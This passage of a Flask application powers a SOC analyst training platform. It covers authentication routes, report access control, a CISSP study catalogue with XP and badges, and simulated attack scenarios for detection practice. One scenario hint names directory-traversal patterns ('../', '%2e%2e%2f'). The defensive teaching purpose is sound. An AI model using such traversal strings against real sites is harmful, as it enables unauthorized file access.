    Rate-limited to 5 attempts/min to prevent brute-forcing the current password.
    New password must pass the same policy as registration.
    """
    error = None
    success = None

    if request.method == "POST":
        current  = request.form.get("current_password", "")
        new_pw   = request.form.get("new_password", "")
        confirm  = request.form.get("confirm_password", "")
        username = session["username"]

        # Verify current password
        row = db_fetchone(f"SELECT * FROM users WHERE username = {PH}", (username,))
        if not row or not bcrypt.checkpw(current.encode(), row["password"].encode()):
            error = "Current password is incorrect."
            security_log.warning(f"CHANGE_PASSWORD_FAILED username={username} ip={request.remote_addr}")
        elif new_pw == current:
            error = "New password must be different from your current password."
        elif (pw_error := validate_password(new_pw)):
            error = pw_error
        elif new_pw != confirm:
            error = "New passwords do not match."
        else:
            hashed = bcrypt.hashpw(new_pw.encode(), bcrypt.gensalt())
            db_run(
                f"UPDATE users SET password = {PH} WHERE username = {PH}",
                (hashed.decode(), username),
            )
            security_log.info(f"CHANGE_PASSWORD_SUCCESS username={username} ip={request.remote_addr}")
            success = "Password updated successfully."

    return render_template("change_password.html", error=error, success=success)


# --- ROUTE 0b: Register (A03: Injection, A07: Auth Failures) ---
@app.route("/register", methods=["GET", "POST"])
def register():
    """
    Block job: create a new user account with validated, hashed credentials.

    Trust boundary: all input from request.form is untrusted.
    Validation happens before anything touches the database.
    On success, redirect to login — never auto-login after registration.
    """
    error = None

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        confirm  = request.form.get("confirm", "")

        # --- Validation block ---
        if not username or not password:
            error = "Username and password are required."
        elif len(username) < 3 or len(username) > 50:
            error = "Username must be between 3 and 50 characters."
        elif (error := validate_password(password)):
            pass  # error already set by validate_password
        elif password != confirm:
            error = "Passwords do not match."
        else:
            # --- Duplicate check ---
            existing = db_fetchone(
                f"SELECT id FROM users WHERE username = {PH}", (username,)
            )

            if existing:
                error = "Registration failed. Please try again."  # generic — no enumeration
            else:
                # --- Hash and store ---
                import secrets as _secrets
                hashed  = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
                api_key = _secrets.token_urlsafe(32)
                db_run(
                    f"INSERT INTO users (username, password, api_key) VALUES ({PH}, {PH}, {PH})",
                    (username, hashed.decode(), api_key),
                )
                security_log.info(f"REGISTER_SUCCESS username={username} ip={request.remote_addr}")
                return redirect(url_for("login"))

    return render_template("register.html", error=error)


# --- ROUTE 0d: Emergency password reset (token-gated, no session required) ---
@app.route("/reset-pw/<token>", methods=["GET", "POST"])
def emergency_reset(token):
    """
    Token-gated password reset for account recovery.
    Set RESET_TOKEN in Railway env vars; the URL is /reset-pw/<that token>.
    Remove the env var after use to disable the route.
    Trust boundary: token must match RESET_TOKEN exactly (no brute force —
    the route returns 404 if RESET_TOKEN is not configured at all).
    """
    expected = os.environ.get("RESET_TOKEN", "")
    if not expected or token != expected:
        abort(404)   # looks like any other missing page — no hint the route exists

    error = None
    success = None

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        new_pw   = request.form.get("new_password", "")
        confirm  = request.form.get("confirm_password", "")

        row = db_fetchone(f"SELECT id FROM users WHERE username = {PH}", (username,))
        if not row:
            error = "Username not found."
        elif (pw_error := validate_password(new_pw)):
            error = pw_error
        elif new_pw != confirm:
            error = "Passwords do not match."
        else:
            hashed = bcrypt.hashpw(new_pw.encode(), bcrypt.gensalt())
            db_run(f"UPDATE users SET password = {PH} WHERE username = {PH}",
                   (hashed.decode(), username))
            security_log.info(f"EMERGENCY_RESET username={username} ip={request.remote_addr}")
            success = f"Password for '{username}' updated. You can now log in."

    return render_template("emergency_reset.html", error=error, success=success, token=token)


# --- ROUTE 1: Home ---
@app.route("/")
def index():
    """Landing page with navigation to lab routes."""
    return render_template("index.html")


# --- ROUTE 2: Search (PATCHED — SQL Injection fixed on main) ---
@app.route("/search")
@login_required
def search():
    """
    Search users by username substring.

    Block job: run a read-only query and pass rows to the template. On `main` the
    query is parameterized so user input cannot change SQL structure (A03: Injection).
    """
    query = request.args.get("q", "")
    security_log.info(f"SEARCH username={session.get('username')} query={query!r} ip={request.remote_addr}")

    # SAFE: Parameterized query — placeholder passed separately as a tuple.
    # The database treats the value as DATA only, never as SQL syntax.
    results = db_fetchall(
        f"SELECT * FROM users WHERE username LIKE {PH}", (f"%{query}%",)
    )

    return render_template("search.html", query=query, results=results)


# --- ROUTE 3: Greeting (PATCHED — XSS fixed on main) ---
@app.route("/greeting")
@login_required
def greeting():
    """
    Personalized greeting from the `name` query parameter.

    Block job: pass untrusted text to Jinja2 with default auto-escaping (no |safe).
    See `vulnerable` branch for the unsafe |safe pattern (Phase 2).
    """
    name = request.args.get("name", "visitor")
    return render_template("greeting.html", name=name)


# --- ROUTE 4: Reports Dashboard (Boundry.AI) ---
@app.route("/reports")
@login_required
def reports():
    """
    List all generated incident reports from the database, newest first.
    Reports are stored in PostgreSQL so they survive Railway redeployments
    (the ephemeral filesystem would lose .md files on every push).
    Protected by login_required: clients log in to view their reports.
    """
    # Clients see only their own reports (owner_id = their user_id).
    # Analysts use /control-room which shows all reports.
    user_id = session.get("user_id")
    report_list = db_fetchall(
        f"SELECT id, created_at, threat_count, event_count FROM reports "
        f"WHERE owner_id = {PH} ORDER BY id DESC",
        (user_id,),
    )
    return render_template("reports.html", reports=report_list)


@app.route("/reports/<int:report_id>")
@login_required
def report_detail(report_id):
    """
    Render a single incident report from the database as HTML.
    Uses an integer primary key — no path traversal risk (no filesystem access).
    """
    row = db_fetchone(
        f"SELECT id, created_at, threat_count, event_count, content, status, analyst_notes, owner_id "
        f"FROM reports WHERE id = {PH}",
        (report_id,),
    )

    if not row:
        abort(404)

    # Clients can only view their own reports (A01: Broken Access Control).
    # Analysts can view any report.
    if session.get("role") != "analyst":
        if row["owner_id"] != session.get("user_id"):
            abort(403)

    html_content = Markup(markdown.markdown(row["content"], extensions=["tables"]))
    return render_template(
        "report_detail.html",
        content=html_content,
        report_id=row["id"],
        created_at=row["created_at"],
        threat_count=row["threat_count"],
        event_count=row["event_count"],
        status=row["status"] or "new",
        analyst_notes=row["analyst_notes"] or "",
    )


# --- ROUTE 4a: PDF Report Download ---
@app.route("/reports/<int:report_id>/pdf")
@login_required
def report_pdf(report_id):
    """
    Generate and stream a branded Boundry.AI PDF for a given report.
    Clients can only download their own reports; analysts can download any.
    """
    row = db_fetchone(
        f"SELECT id, created_at, threat_count, event_count, content, owner_id "
        f"FROM reports WHERE id = {PH}",
        (report_id,),
    )
    if not row:
        abort(404)

    # Access control — clients see only their own reports
    if session.get("role") != "analyst":
        if row["owner_id"] != session.get("user_id"):
            abort(403)

    try:
        from pdf_generator import generate_report_pdf
        pdf_bytes = generate_report_pdf(
            report_id    = row["id"],
            created_at   = row["created_at"],
            threat_count = row["threat_count"],
            event_count  = row["event_count"],
            content_md   = row["content"],
        )
        filename = f"BoundryAI_Incident_Report_{report_id}.pdf"
        return Response(
            pdf_bytes,
            mimetype="application/pdf",
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )
    except Exception as exc:
        security_log.error(f"PDF_GENERATION_ERROR report_id={report_id} error={exc}")
        flash(f"PDF generation failed: {exc}", "danger")
        return redirect(url_for("report_detail", report_id=report_id))


# ── CISSP Domain catalogue ───────────────────────────────────────────────────
# 8 ISC(2) CISSP domains with exam weight, colour token, key topics, and an
# optional "SOC bridge" note showing how existing training already covers the domain.
CISSP_DOMAINS = {
    1: {
        "name": "Security and Risk Management",
        "weight": 16,
        "color": "#ff6a00",
        "key_topics": ["CIA Triad", "Risk Management", "Security Governance", "Compliance & Legal",
                       "BCP / DRP Planning", "Ethics", "Threat Modelling", "Security Policies"],
        "soc_bridge": "Your incident triage workflow (severity classification, escalation decisions, writing investigation notes before reading the AI report) is a live practicum in risk management and governance — the core of this domain.",
    },
    2: {
        "name": "Asset Security",
        "weight": 10,
        "color": "#9944ee",
        "key_topics": ["Data Classification", "Asset Lifecycle", "Data Retention & Destruction",
                       "DLP", "DRM / CASB", "Data Roles (Owner, Custodian, User)", "Privacy"],
        "soc_bridge": None,
    },
    3: {
        "name": "Security Architecture and Engineering",
        "weight": 13,
        "color": "#cc6600",
        "key_topics": ["Cryptography (RSA, AES, PKI)", "Security Models (Bell-LaPadula, Biba)",
                       "Zero Trust Architecture", "Security Frameworks", "Physical Security",
                       "Secure Design Principles", "Virtualisation & Cloud Security"],
        "soc_bridge": None,
    },
    4: {
        "name": "Communication and Network Security",
        "weight": 13,
        "color": "#4488ff",
        "key_topics": ["OSI / TCP-IP Model", "Firewalls & IDS/IPS", "VPNs & Tunnelling",
                       "Wireless Security", "Network Attacks", "Secure Protocols (TLS, SSH, HTTPS)",
                       "Microsegmentation"],
        "soc_bridge": None,
    },
    5: {
        "name": "Identity and Access Management",
        "weight": 13,
        "color": "#ff8833",
        "key_topics": ["Authentication Factors", "MFA & SSO", "Kerberos & SAML & OAuth",
                       "RBAC / ABAC / MAC / DAC", "Privileged Access Management",
                       "Zero Trust IAM", "Federation & Directory Services"],
        "soc_bridge": "Your brute force, credential stuffing, password spray, and privilege escalation scenarios are live demonstrations of IAM failures. Each one maps to a specific CISSP exam sub-topic in this domain.",
    },
    6: {
        "name": "Security Assessment and Testing",
        "weight": 12,
        "color": "#44aaee",
        "key_topics": ["Vulnerability Scanning vs Pen Testing", "Security Audits", "Code Review",
                       "Log Analysis & SIEM", "BCP / DRP Testing", "Continuous Monitoring",
                       "Red vs Blue vs Purple Teams"],
        "soc_bridge": "Running your attack simulations and reading the AI-generated incident reports is hands-on Security Assessment and Testing. You are doing what Domain 6 tests — you just haven't been calling it that.",
    },
    7: {
        "name": "Security Operations",
        "weight": 13,
        "color": "#00b432",
        "key_topics": ["Incident Response (Preparation → Lessons Learned)", "SIEM & SOC Operations",
                       "Threat Intelligence", "Digital Forensics & Chain of Custody",
                       "BCP / DRP Execution", "Logging & Monitoring", "eDiscovery"],
        "soc_bridge": "This is your strongest domain. Your daily SOC training covers IR workflow, log analysis, IOC identification, threat detection, report triage, and analyst scoring — all core Domain 7 exam topics.",
    },
    8: {
        "name": "Software Development Security",
        "weight": 10,
        "color": "#6655aa",
        "key_topics": ["SDLC Security Phases", "OWASP Top 10", "Secure Coding Practices",
                       "Code Review Techniques", "SQL Injection & XSS", "DevSecOps",
                       "API Security", "Threat Modelling in SDLC"],
        "soc_bridge": "Your SQL injection and XSS attack scenarios directly demonstrate OWASP Top 10 vulnerabilities — the core of what Domain 8 tests on the exam.",
    },
}

# --- RPG Level system: 12 levels from Security Apprentice to CISSP Certified ---
# (level, xp_required, title, icon)
LEVEL_THRESHOLDS = [
    (1,     0,     "Security Apprentice",   "🔰"),
    (2,     100,   "Threat Analyst",        "🔍"),
    (3,     300,   "Risk Assessor",         "⚖️"),
    (4,     600,   "Domain Guardian",       "🛡️"),
    (5,     1000,  "Network Defender",      "🌐"),
    (6,     1500,  "Identity Warden",       "🔑"),
    (7,     2200,  "Architecture Engineer", "⚙️"),
    (8,     3000,  "Security Architect",    "🏗️"),
    (9,     4000,  "Operations Commander",  "📡"),
    (10,    5500,  "Risk Manager",          "📊"),
    (11,    7500,  "Security Executive",    "👔"),
    (12,    10000, "CISSP Certified",       "🏆"),
]

# XP earned by various actions
XP_REWARDS = {
    "cissp_correct":        10,   # Correct CISSP answer
    "cissp_attempt":         2,   # Any CISSP answer (wrong still gets 2)
    "scenario_complete":    50,   # Finish a SOC training scenario
    "scenario_bonus":       25,   # High-score bonus (≥80 points)
    "scan_run":             30,   # Run machine or network scan
    "finding_resolved":     25,   # Mark a real finding as fixed
    "daily_login":          15,   # First XP action of the day
    "streak_bonus":          5,   # Per-day streak multiplier (added once/day)
    "mitre_read":            5,   # Read a MITRE technique page
}

# Achievement badges — 20 total
ACHIEVEMENTS = {
    "first_blood":   {"name": "First Blood",       "icon": "🩸", "desc": "Answer your first CISSP question"},
    "on_fire":       {"name": "On Fire",            "icon": "🔥", "desc": "Get 5 questions correct in a row"},
    "week_warrior":  {"name": "Week Warrior",       "icon": "📅", "desc": "Study 7 days in a row"},
    "domain_1":      {"name": "Risk Manager",       "icon": "⚖️",  "desc": "Complete 10 Domain 1 questions"},
    "domain_2":      {"name": "Data Guardian",      "icon": "💾",  "desc": "Complete 10 Domain 2 questions"},
    "domain_3":      {"name": "Crypto Master",      "icon": "🔐",  "desc": "Complete 10 Domain 3 questions"},
    "domain_4":      {"name": "Net Defender",       "icon": "🌐",  "desc": "Complete 10 Domain 4 questions"},
    "domain_5":      {"name": "IAM Warden",         "icon": "🔑",  "desc": "Complete 10 Domain 5 questions"},
    "domain_6":      {"name": "Audit Ace",          "icon": "📋",  "desc": "Complete 10 Domain 6 questions"},
    "domain_7":      {"name": "SOC Operator",       "icon": "📡",  "desc": "Complete 10 Domain 7 questions"},
    "domain_8":      {"name": "Code Guardian",      "icon": "💻",  "desc": "Complete 10 Domain 8 questions"},
    "all_domains":   {"name": "Polymath",           "icon": "🧠",  "desc": "Study all 8 CISSP domains"},
    "centurion":     {"name": "Centurion",          "icon": "💯",  "desc": "Answer 100 CISSP questions"},
    "sharp_shooter": {"name": "Sharp Shooter",      "icon": "🎯",  "desc": "Reach 80%+ accuracy (min 20 Qs)"},
    "scanner":       {"name": "Scanner",            "icon": "🔎",  "desc": "Run your first system scan"},
    "vuln_hunter":   {"name": "Vuln Hunter",        "icon": "🦠",  "desc": "Find 5 real system vulnerabilities"},
    "fixer":         {"name": "The Fixer",          "icon": "🔧",  "desc": "Resolve 3 system findings"},
    "scenario_ace":  {"name": "Scenario Ace",       "icon": "🎮",  "desc": "Complete all 10 SOC scenarios"},
    "level_5":       {"name": "Mid-game Hero",      "icon": "⚡",  "desc": "Reach Level 5"},
    "cissp_ready":   {"name": "CISSP Ready",        "icon": "🏆",  "desc": "Reach readiness score 700+"},
}


def _xp_for_level(level_num):
    """Return (xp_required, xp_for_next) for progress bar math."""
    current_thresh = next((t for t in LEVEL_THRESHOLDS if t[0] == level_num), LEVEL_THRESHOLDS[0])
    next_thresh    = next((t for t in LEVEL_THRESHOLDS if t[0] == level_num + 1), None)
    return current_thresh[1], (next_thresh[1] if next_thresh else current_thresh[1])


def get_player_profile(analyst_id):
    """
    Return the player's full RPG profile dict, creating the row if it doesn't exist.
    Adds convenience fields: level_name, level_icon, xp_to_next, xp_in_level, level_pct.
    """
    profile = db_fetchone(
        f"SELECT * FROM player_profile WHERE analyst_id = {PH}", (analyst_id,)
    )
    if not profile:
        db_run(
            f"INSERT INTO player_profile (analyst_id, xp, level, streak_days, last_xp_date) "
            f"VALUES ({PH}, 0, 1, 0, NULL)",
            (analyst_id,),
        )
        profile = db_fetchone(
            f"SELECT * FROM player_profile WHERE analyst_id = {PH}", (analyst_id,)
        )

    level = profile["level"] or 1
    level_data   = next((t for t in LEVEL_THRESHOLDS if t[0] == level),     LEVEL_THRESHOLDS[0])
    next_data    = next((t for t in LEVEL_THRESHOLDS if t[0] == level + 1), None)
    xp_this_lvl = level_data[1]
    xp_next_lvl = next_data[1] if next_data else xp_this_lvl + 1
    xp_total     = profile["xp"] or 0
    xp_in_level  = xp_total - xp_this_lvl
    xp_span      = max(1, xp_next_lvl - xp_this_lvl)
    level_pct    = min(100, round(xp_in_level / xp_span * 100))

    badges = db_fetchall(
        f"SELECT badge_id FROM player_achievements WHERE analyst_id = {PH}", (analyst_id,)
    )

    return {
        **profile,
        "level_name":  level_data[2],
        "level_icon":  level_data[3],
        "xp_to_next":  max(0, xp_next_lvl - xp_total),
        "xp_in_level": max(0, xp_in_level),
        "xp_span":     xp_span,
        "level_pct":   level_pct,
        "is_max":      next_data is None,
        "badges":      [b["badge_id"] for b in badges],
    }


def award_xp(analyst_id, amount, reason, source=""):
    """
    Award XP to an analyst. Updates player_profile, logs the transaction,
    checks for level-ups and achievement unlocks.
    Returns a notification dict for the browser (XP toast + level-up modal).
    """
    today = datetime.utcnow().strftime("%Y-%m-%d")

    # Ensure profile exists
    profile = get_player_profile(analyst_id)
    old_xp    = profile["xp"]   or 0
    old_level = profile["level"] or 1
    new_xp    = old_xp + amount

    # Calculate new level
    new_level = 1
    for lvl, threshold, _name, _icon in LEVEL_THRESHOLDS:
        if new_xp >= threshold:
            new_level = lvl

    # Update streak
    streak    = profile["streak_days"] or 0
    last_date = profile["last_xp_date"]
    yesterday = (datetime.utcnow() - timedelta(days=1)).strftime("%Y-%m-%d")
    if last_date == today:
        pass            # Same day — streak unchanged
    elif last_date == yesterday:
        streak += 1     # Consecutive day
    else:
        streak = 1      # Streak reset

    db_run(
        f"UPDATE player_profile "
        f"SET xp = {PH}, level = {PH}, streak_days = {PH}, last_xp_date = {PH} "
        f"WHERE analyst_id = {PH}",
        (new_xp, new_level, streak, today, analyst_id),
    )

    # Log the transaction
    db_run(
        f"INSERT INTO xp_log (analyst_id, amount, reason, source) VALUES ({PH},{PH},{PH},{PH})",
        (analyst_id, amount, reason, source),
    )

    # --- Achievement checks ---
    existing_badges = {
        r["badge_id"] for r in db_fetchall(
            f"SELECT badge_id FROM player_achievements WHERE analyst_id = {PH}", (analyst_id,)
        )
    }
    new_achievements = []

    def _maybe_unlock(badge_id):
        if badge_id in existing_badges or badge_id not in ACHIEVEMENTS:
            return
        db_run(
            f"INSERT INTO player_achievements (analyst_id, badge_id) VALUES ({PH},{PH})",
            (analyst_id, badge_id),
        )
        new_achievements.append({"badge_id": badge_id, **ACHIEVEMENTS[badge_id]})
        existing_badges.add(badge_id)

    # CISSP question totals
    total_row = db_fetchone(
        f"SELECT COUNT(*) AS cnt FROM cissp_attempts "
        f"WHERE analyst_id = {PH} AND is_correct IS NOT NULL AND skipped = 0",
        (analyst_id,),
    )
    total_q = total_row["cnt"] if total_row else 0

    if total_q >= 1:   _maybe_unlock("first_blood")
    if total_q >= 100: _maybe_unlock("centurion")

    # Per-domain 10-question badges
    for d in range(1, 9):
        dom_row = db_fetchone(
            f"SELECT COUNT(*) AS cnt FROM cissp_attempts "
            f"WHERE analyst_id = {PH} AND domain_num = {PH} "
            f"AND is_correct IS NOT NULL AND skipped = 0",
            (analyst_id, d),
        )
        if dom_row and dom_row["cnt"] >= 10:
            _maybe_unlock(f"domain_{d}")

    # All 8 domains studied
    dom_started = db_fetchone(
        f"SELECT COUNT(DISTINCT domain_num) AS cnt FROM cissp_progress "
        f"WHERE analyst_id = {PH} AND attempts >= 1",
        (analyst_id,),
    )
    if dom_started and dom_started["cnt"] == 8:
        _maybe_unlock("all_domains")

    # Sharp Shooter — 80%+ accuracy at 20+ questions
    if total_q >= 20:
        correct_row = db_fetchone(
            f"SELECT COUNT(*) AS cnt FROM cissp_attempts "
            f"WHERE analyst_id = {PH} AND is_correct = 1 AND skipped = 0",
            (analyst_id,),
        )
        if correct_row and correct_row["cnt"] / total_q >= 0.80:
            _maybe_unlock("sharp_shooter")

    # Streak badges
    if streak >= 7:   _maybe_unlock("week_warrior")

    # Level badge
    if new_level >= 5: _maybe_unlock("level_5")

    # CISSP readiness 700+
    readiness = _cissp_readiness_score(analyst_id)
    if readiness >= 700: _maybe_unlock("cissp_ready")

    # Scanner / Vuln Hunter / Fixer from player_profile counters
    fresh_profile = db_fetchone(
        f"SELECT total_scans, total_findings_resolved FROM player_profile WHERE analyst_id = {PH}",
        (analyst_id,),
    )
    if fresh_profile:
        if (fresh_profile["total_scans"] or 0) >= 1:
            _maybe_unlock("scanner")
        if (fresh_profile["total_findings_resolved"] or 0) >= 3:
            _maybe_unlock("fixer")

    findings_row = db_fetchone(f"SELECT COUNT(*) AS cnt FROM system_findings", ())
    if findings_row and (findings_row["cnt"] or 0) >= 5:
        _maybe_unlock("vuln_hunter")

    # Scenario Ace — all 10 SOC scenarios completed
    scen_row = db_fetchone(
        f"SELECT COUNT(DISTINCT scenario_name) AS cnt FROM training_attempts "
        f"WHERE analyst_id = {PH} AND score_total IS NOT NULL",
        (analyst_id,),
    )
    if scen_row and scen_row["cnt"] >= 10:
        _maybe_unlock("scenario_ace")

    level_up = new_level > old_level
    new_level_data = next((t for t in LEVEL_THRESHOLDS if t[0] == new_level), LEVEL_THRESHOLDS[0])

    return {
        "xp_gained":        amount,
        "new_total":        new_xp,
        "old_level":        old_level,
        "new_level":        new_level,
        "level_name":       new_level_data[2],
        "level_icon":       new_level_data[3],
        "level_up":         level_up,
        "new_achievements": new_achievements,
        "streak":           streak,
    }


# --- Training Mode scenario catalogue ---
# Each entry defines one structured training challenge.
# sim_fn maps to SCENARIO_MAP keys inside _simulate_attack_core.
# sim_chain maps to VALID_CHAINS / APT_CHAINS keys.
# techniques / succeeded are the GROUND TRUTH used for rule-based scoring.
TRAINING_SCENARIOS = {
    "t01_brute_force": {
        "label": "Scenario 1 — Brute Force",
        "track": "Beginner", "order": 1,
        "description": "A single-vector credential attack against one account. Classic and the easiest pattern to spot.",
        "sim_fn": "brute_force", "sim_chain": None,
        "techniques": ["T1110"], "succeeded": True,
        "hint": "Count the LOGIN_FAILED events from a single IP. Then look for what comes after.",
    },
    "t02_sql_injection": {
        "label": "Scenario 2 — SQL Injection",
        "track": "Beginner", "order": 2,
        "description": "An attacker probing web input fields with SQL payloads to extract database data.",
        "sim_fn": "sql_injection", "sim_chain": None,
        "techniques": ["T1190"], "succeeded": False,
        "hint": "Check the SEARCH event payloads — they contain the injection strings.",
    },
    "t03_directory_traversal": {
        "label": "Scenario 3 — Directory Traversal",
        "track": "Beginner", "order": 3,
        "description": "An attacker attempting to escape the web root to read system files.",
        "sim_fn": "directory_traversal", "sim_chain": None,
        "techniques": ["T1083"], "succeeded": False,
        "hint": "Look for ../ and %2e%2e%2f patterns in DIRECTORY_TRAVERSAL events.",
    },
    "t04_credential_stuffing": {
        "label": "Scenario 4 — Credential Stuffing",
        "track": "Intermediate", "order": 4,
        "description": "A breach dump used to test credentials across multiple accounts simultaneously.",
        "sim_fn": "credential_stuffing", "sim_chain": None,
        "techniques": ["T1110.004"], "succeeded": True,
        "hint": "Same IP, many different accounts, each failing 1-2 times — then one succeeds.",
    },
    "t05_password_spray": {
        "label": "Scenario 5 — Password Spray",
        "track": "Intermediate", "order": 5,
        "description": "One common password tried across many accounts — designed to stay below lockout thresholds.",
        "sim_fn": "password_spray", "sim_chain": None,
        "techniques": ["T1110.003"], "succeeded": False,
        "hint": "Check the extra field on LOGIN_FAILED events — it contains a key clue.",
    },
    "t06_privilege_escalation": {
        "label": "Scenario 6 — Privilege Escalation",
        "track": "Intermediate", "order": 6,
        "description": "A logged-in account probing restricted admin routes to gain elevated access.",
        "sim_fn": "privilege_escalation", "sim_chain": None,
        "techniques": ["T1548"], "succeeded": False,
        "hint": "Look for PRIV_ESC_ATTEMPT events following a LOGIN_SUCCESS from the same IP.",
    },
    "t07_suspicious_login": {
        "label": "Scenario 7 — Account Takeover",
        "track": "Advanced", "order": 7,
        "description": "A valid account logs in from an unusual IP at an unusual hour. No failed attempts — credentials were stolen, not guessed.",
        "sim_fn": "suspicious_login", "sim_chain": None,
        "techniques": ["T1078"], "succeeded": True,
        "hint": "No brute force precedes this. The extra field on the LOGIN_SUCCESS event is the tell.",
    },
    "t08_recon_to_takeover": {
        "label": "APT 1 — Recon → Stuffing → Takeover → Priv Esc",
        "track": "APT Chain", "order": 8,
        "description": "Four-phase attack: Reconnaissance → Credential Stuffing → Account Takeover → Privilege Escalation. The classic APT entry pattern.",
        "sim_fn": None, "sim_chain": "recon_to_takeover",
        "techniques": ["T1589.001", "T1110.004", "T1078", "T1548"], "succeeded": True,
        "hint": "This is a kill chain — four techniques in sequence. Identify each phase.",
    },
    "t09_web_exploit_chain": {
        "label": "APT 2 — Brute Force → Login → XSS → SQLi → Traversal",
        "track": "APT Chain", "order": 9,
        "description": "Five-phase attack: force entry via brute force, then methodically probe for data extraction. Full web attack chain.",
        "sim_fn": None, "sim_chain": "web_exploit_chain",
        "techniques": ["T1110", "T1078", "T1059.007", "T1190", "T1083"], "succeeded": True,
        "hint": "Map each unique event type to its MITRE technique. There are five.",
    },
    "t10_stealthy_apt": {
        "label": "APT 3 — Stealthy APT (Low-and-Slow)",
        "track": "APT Chain", "order": 10,
        "description": "The hardest scenario: low-and-slow spray → suspicious login → quiet XSS → careful escalation. Designed to evade detection.",
        "sim_fn": None, "sim_chain": "stealthy_apt",
        "techniques": ["T1110.003", "T1078", "T1059.007", "T1548"], "succeeded": True,
        "hint": "Low failure counts, valid credentials, patient probing. Think like the defender, not just the log reader.",
    },
}


# --- ROUTE 4c: MITRE ATT&CK Technique Detail Pages ---
@app.route("/mitre/<technique_id>")
@analyst_required
def mitre_detail(technique_id):
    """
    Full-page MITRE ATT&CK reference for a single technique.
    Covers: what it is, how it works, detection signals, business impact,
    mitigation controls, and incident response playbook.
    Analyst-only — client accounts don't need raw framework detail.
    """
    from mitre_reference import get_technique, get_all_techniques
    technique = get_technique(technique_id.upper())
    if not technique:
        abort(404)
    all_techniques = get_all_techniques()
    return render_template(
        "mitre_detail.html",
        technique=technique,
        all_techniques=all_techniques,
    )


# --- ROUTE 4d: Training Mode ---

@app.route("/training")
@analyst_required
def training_dashboard():
    """Main training dashboard — curriculum progress, scenario grid, stats."""
    import json as _json
    analyst_id = session["user_id"]

    # MITRE reading progress
    read_rows = db_fetchall(
        f"SELECT technique_id FROM training_mitre_progress WHERE analyst_id = {PH}",
        (analyst_id,),
    )
    read_ids = {r["technique_id"] for r in read_rows}

    from mitre_reference import get_all_techniques
    all_mitre = get_all_techniques()

    # Completed attempts (submitted only)
    attempts = db_fetchall(
        f"SELECT scenario_name, score_total, submitted_at FROM training_attempts "
        f"WHERE analyst_id = {PH} AND submitted_at IS NOT NULL ORDER BY submitted_at DESC",
        (analyst_id,),
    )
    completed_names = {a["scenario_name"] for a in attempts}

    # Per-scenario best score
    best_scores = {}
    for a in attempts:
        sn = a["scenario_name"]
        st = a["score_total"] or 0
        if sn not in best_scores or st > best_scores[sn]:
            best_scores[sn] = st

    # Overall stats
    total_attempts   = len(attempts)
    avg_score        = round(sum(a["score_total"] or 0 for a in attempts) / max(total_attempts, 1), 1)
    scenarios_done   = len(completed_names)
    mitre_read_count = len(read_ids)

    # Build flat scenario list with key and best_score embedded
    scenario_list = []
    for k, v in sorted(TRAINING_SCENARIOS.items(), key=lambda x: x[1]["order"]):
        scenario_list.append({
            **v,
            "key":        k,
            "is_done":    k in completed_names,
            "best_score": best_scores.get(k),
        })

    # Recent attempts with enough context for the history table
    recent_attempts = db_fetchall(
        f"SELECT id, scenario_label, score_total, score_techniques, score_ip, "
        f"score_succeeded, score_iocs, score_response, submitted_at "
        f"FROM training_attempts WHERE analyst_id = {PH} AND submitted_at IS NOT NULL "
        f"ORDER BY submitted_at DESC LIMIT 30",
        (analyst_id,),
    )

    return render_template(
        "training.html",
        all_mitre=all_mitre,
        read_ids=read_ids,
        scenario_list=scenario_list,
        recent_attempts=recent_attempts,
        total_attempts=total_attempts,
        avg_score=avg_score,
        scenarios_done=scenarios_done,
        mitre_read_count=mitre_read_count,
    )


@app.route("/training/mitre-read/<technique_id>", methods=["POST"])
@analyst_required
def training_mitre_read(technique_id):
    """Mark a MITRE technique as read. Idempotent."""
    analyst_id = session["user_id"]
    try:
        db_run(
            f"INSERT OR IGNORE INTO training_mitre_progress (analyst_id, technique_id) VALUES ({PH},{PH})",
            (analyst_id, technique_id.upper()),
        )
    except Exception:
        pass
    return redirect(url_for("training_dashboard", just_read=technique_id.upper()))


@app.route("/training/start/<scenario_name>", methods=["POST"])
@analyst_required
def training_start(scenario_name):
    """
    Fire a training scenario: flush stale events, simulate, run agent,
    capture ground truth, create attempt record, redirect to challenge page.
    """
    import json as _json
    if scenario_name not in TRAINING_SCENARIOS:
        abort(404)

    sc         = TRAINING_SCENARIOS[scenario_name]
    analyst_id = session["user_id"]

    # 1. Mark all existing unprocessed events as processed so only this
    #    scenario's events land in the training report.
    db_run(
        f"UPDATE security_events SET processed = {PH} "
        f"WHERE processed = {PH} AND owner_id = {PH}",
        (1, 0, analyst_id),
    )

    # 2. Capture max event ID before firing (to isolate new events)
    before_row = db_fetchone(
        f"SELECT COALESCE(MAX(id), 0) AS max_id FROM security_events WHERE owner_id = {PH}",
        (analyst_id,),
    )
    before_max = before_row["max_id"]

    # 3. Fire the simulation
    _simulate_attack_core(
        owner_id  = analyst_id,
        scenario  = sc["sim_fn"],
        chain     = sc["sim_chain"],
    )

    # 4. Fetch the events just inserted
    new_events = db_fetchall(
        f"SELECT * FROM security_events WHERE owner_id = {PH} AND id > {PH} ORDER BY id",
        (analyst_id, before_max),
    )

    # 5. Derive ground truth from actual events
    #    Attacker IPs are non-RFC-1918 / non-loopback addresses
    attacker_ips = list({
        e["ip"] for e in new_events
        if not e["ip"].startswith("10.")
        and not e["ip"].startswith("172.")
        and not e["ip"].startswith("192.168.")
        and e["ip"] not in ("127.0.0.1", "::1", "")
    })
    actual_ip = attacker_ips[0] if attacker_ips else "unknown"
    actual_succeeded = int(any(
        e["event_type"] == "LOGIN_SUCCESS" and e["ip"] == actual_ip
        for e in new_events
    ))

    # 6. Run agent to generate the AI report
    result = _run_agent_core(
        triggered_by = session.get("username", "training"),
        owner_id     = analyst_id,
    )
    report_id = result.get("report_id")

    # 7. Create the attempt record
    db_run(
        f"INSERT INTO training_attempts "
        f"(analyst_id, scenario_name, scenario_label, report_id, "
        f" actual_techniques, actual_attacker_ip, actual_succeeded) "
        f"VALUES ({PH},{PH},{PH},{PH},{PH},{PH},{PH})",
        (
            analyst_id,
            scenario_name,
            sc["label"],
            report_id,
            _json.dumps(sc["techniques"]),
            actual_ip,
            actual_succeeded,
        ),
    )
    attempt_id = db_fetchone(
        f"SELECT MAX(id) AS aid FROM training_attempts WHERE analyst_id = {PH}",
        (analyst_id,),
    )["aid"]

    # Store events for the challenge page (as JSON in session — they're small)
    session["training_events"] = [
        {
            "event_type": e["event_type"],
